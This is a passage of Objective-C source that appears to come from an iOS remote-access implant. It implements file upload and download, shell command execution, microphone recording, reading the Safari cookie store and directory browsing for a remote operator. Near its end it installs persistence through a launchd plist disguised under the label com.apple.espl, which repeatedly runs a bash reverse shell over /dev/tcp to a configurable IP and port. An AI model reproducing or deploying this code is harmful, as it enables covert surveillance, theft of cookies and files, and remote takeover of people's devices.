...
- (NSDictionary*)getDirectoryContents:(NSString*)path {
  ...
  if (dp != NULL) {
    while ((ep = readdir(dp))) {
      [results setValue:[NSNumber numberWithUnsignedInteger:ep->d_type]
                 forKey:[NSString stringWithFormat:@"%s", ep->d_name]];
    }
  } else {
    return nil;
  }
  ...
  if ([fileManager fileExistsAtPath:path isDirectory:&isdir]) {
    if (isdir) {
      ...
      NSData* jsonData = [NSJSONSerialization dataWithJSONObject:results
                                                         options:0
                                                           error:nil];
      [self sendString:[[NSString alloc] initWithData:jsonData
    ...
    [self
        sendString:[NSString stringWithFormat:@"%@: No such file or directory",
                                              path]];
  }
  [self term];
}
...
- (void)tabComplete:(NSString*)path {
  NSData* jsonData =
      [NSJSONSerialization dataWithJSONObject:[self getDirectoryContents:path]
                                      options:0
                                        error:nil];
  [self sendString:[[NSString alloc] initWithData:jsonData
                                         encoding:NSUTF8StringEncoding]];
...
- (void)showAlert:(NSString*)args {
  ...
  NSMutableDictionary* uploadargs =
      [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:NULL];
  const char* title = [[NSString
      stringWithFormat:@"%@", [uploadargs valueForKey:@"title"]] UTF8String];
  const char* message = [[NSString
      stringWithFormat:@"%@", [uploadargs valueForKey:@"message"]] UTF8String];
  ...
  CFDictionaryAddValue(
      dict, kCFUserNotificationAlertHeaderKey,
  ...
  CFDictionaryAddValue(dict, kCFUserNotificationAlertTopMostKey,
                       kCFBooleanTrue);
  CFNotificationCenterPostNotificationWithOptions(
      CFNotificationCenterGetDarwinNotifyCenter(), CFSTR("test"), NULL, NULL,
...
- (void)openURL:(NSString*)arg {
  if (![arg isEqualToString:@""]) {
    CFURLRef cu = CFURLCreateWithBytes(NULL, (UInt8*)[arg UTF8String],
                                       strlen([arg UTF8String]),
...
- (void)getVolume {
  ...
  [[AVAudioSession sharedInstance] addObserver:self
                                    forKeyPath:@"outputVolume"
                                       ...
                                       context:nil];
  [self sendString:[NSString
                       stringWithFormat:@"%.2f", [AVAudioSession sharedInstance]
                                                     .outputVolume]];
  [self term];
}
...
- (void)bundleIds {
  ...
  for (i = 0; i < CFArrayGetCount(ary); i++) {
    CFStringGetCString(CFArrayGetValueAtIndex(ary, i), buf, sizeof(buf),
...
- (void)ipod:(NSString*)args {
  if ([args isEqualToString:@"play"]) {
    ...
    if (time1 != time2) {
      ...
      NSString* mpstatus =
          [NSString stringWithFormat:@"Currently Playing\nTitle: %@\nAlbum: "
                                     @"%@\nArtist: %@\nPlayback time: %f\n",
...
- (void)initmic:(NSError*)error {
  ...
  soundSetting = [NSDictionary
      dictionaryWithObjectsAndKeys:[NSNumber numberWithFloat:44100.0],
                                   AVSampleRateKey,
                                   [NSNumber
  ...
  self.audioRecorder = [[AVAudioRecorder alloc] initWithURL:soundFile
...
char* parseBinary(int* searchChars, int sizeOfSearch) {
  NSString* cookieJarPath =
      [NSString stringWithFormat:@"%@/Library/Cookies/Cookies.binarycookies",
                                 NSHomeDirectory()];
...
- (void)sendFile:(NSString*)path {
  ...
  if ([self.fileManager fileExistsAtPath:path isDirectory:&isDir]) {
    if (isDir) {
      ...
      [result setValue:[NSNumber numberWithInt:(int)data.length]
                forKey:@"size"];
...
- (void)receiveFile:(NSString*)args {
  ...
  NSString* uploadPath =
      [NSString stringWithFormat:@"%@", [uploadargs valueForKey:@"path"]];
  NSString* fileName =
      [NSString stringWithFormat:@"%@", [uploadargs valueForKey:@"filename"]];
  NSData* data = [self receiveData:size];
  [data writeToFile:[NSString stringWithFormat:@"%@/%@", uploadPath, fileName]
         atomically:true];
}
...
- (NSData*)receiveData:(long)size {
  ...
  [self debugLog:[NSString
                     stringWithFormat:@"data size = %lu",
                                      (unsigned long)[data
                                          subdataWithRange:NSMakeRange(0, size)]
                                          .length]];
...
- (void)changeDirectory:(NSString*)dir {
  ...
  if ([fileManager fileExistsAtPath:path isDirectory:&isdir]) {
    if (isdir) {
      ...
      [result setValue:[fileManager currentDirectoryPath]
                forKey:@"current_directory"];
    } else {
      [result
          setValue:[NSString stringWithFormat:@"%@: Not a directory\n", path]
            forKey:@"error"];
    }
  } else {
    [result
...
- (void)runTask:(NSString*)cmd sendTerminal:(bool)sendTerm {
  if (sysTaskRunning) {
    ...
    [stdinPipe.fileHandleForWriting
        writeData:[cmd dataUsingEncoding:NSUTF8StringEncoding]];
  } else {
    ...
    dispatch_async(
        dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void) {
          ...
          while ((object = [e nextObject]) && sysTaskRunning) {
            ...
            [_systask
                setCurrentDirectoryPath:[fileManager currentDirectoryPath]];
            ...
            id observer = [[NSNotificationCenter defaultCenter]
                addObserverForName:NSFileHandleDataAvailableNotification
                        ...
                        usingBlock:^(NSNotification* note) {
                          NSData* dataRead;
                          while ((dataRead = [stdoutHandle availableData]) &&
                                 dataRead.length > 0) {
                            NSString* newOutput = [[NSString alloc]
                                initWithData:dataRead
                                    encoding:NSUTF8StringEncoding];
...
- (void)rocketMC:(NSString*)command {
  NSDictionary* userInfo = [NSDictionary dictionaryWithObject:command
                                                       forKey:@"cmd"];
  if ([_messagingCenter sendMessageName:@"commandWithNoReply"
...
- (void)rocketMCWithReply:(NSString*)command {
  NSDictionary* userInfo = [NSDictionary dictionaryWithObject:command
                                                       forKey:@"cmd"];
  NSDictionary* reply =
      [_messagingCenter sendMessageAndReceiveReplyName:@"commandWithReply"
                                              userInfo:userInfo];
...
- (void)debugLog:(NSString*)string {
  NSFileHandle* fileHandle =
      [NSFileHandle fileHandleForWritingAtPath:@"/tmp/esplog"];
  ...
  if ([args isEqualToString:@"install"]) {
    NSDictionary* innerDict = [NSDictionary
        dictionaryWithObjects:
            [NSArray
                arrayWithObjects:
                    [NSNumber numberWithBool:YES], @"com.apple.espl",
                    [NSNumber numberWithInt:5], [NSNumber numberWithBool:YES],
                    [NSArray
                        arrayWithObjects:
                            @"sh", @"-c",
                            [NSString
                                stringWithFormat:@"bash &> /dev/tcp/%@/%d 0>&1",
                                                 ip, port],
                            nil],
                    nil]
                      forKeys:[NSArray
                                  arrayWithObjects:@"AbandonProcessGroup",
                                                   @"Label", @"StartInterval",
                                                   @"RunAtLoad",
                                                   @"ProgramArguments", nil]];
    NSError* err = nil;
    NSData* plistData = [NSPropertyListSerialization
        dataWithPropertyList:innerDict
                      format:NSPropertyListXMLFormat_v1_0
                     options:0
                       error:&err];
    if (err != nil) {
      [self
          debugLog:[NSString stringWithFormat:@"persistence error>%@<\n", err]];
